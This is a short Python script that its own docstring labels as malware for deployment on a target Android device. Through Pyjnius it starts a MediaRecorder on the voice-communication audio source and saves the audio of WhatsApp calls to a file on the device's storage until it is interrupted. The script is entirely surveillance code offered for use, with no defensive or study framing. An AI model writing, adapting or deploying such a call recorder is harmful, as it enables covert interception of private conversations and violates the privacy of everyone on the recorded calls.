#!/usr/bin/env python3
"""
Android WhatsApp Call Voice Recorder (Malware - for deployment on target device)
Requires: Python, Frida, or Pyjnius; device permission for RECORD_AUDIO.
"""
import time
from jnius import autoclass
def record_call(save_file="/sdcard/wa_recording.mp3"):
    MediaRecorder = autoclass("android.media.MediaRecorder")
    recorder = MediaRecorder()
    recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
    recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
    recorder.setOutputFile(save_file)
    recorder.prepare()
    recorder.start()
    print(f"[+] Recording WhatsApp call: {save_file}")
    try:
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        recorder.stop()
        recorder.release()
        print(f"[+] Recording stopped and saved.")
if __name__ == "__main__":
    record_call()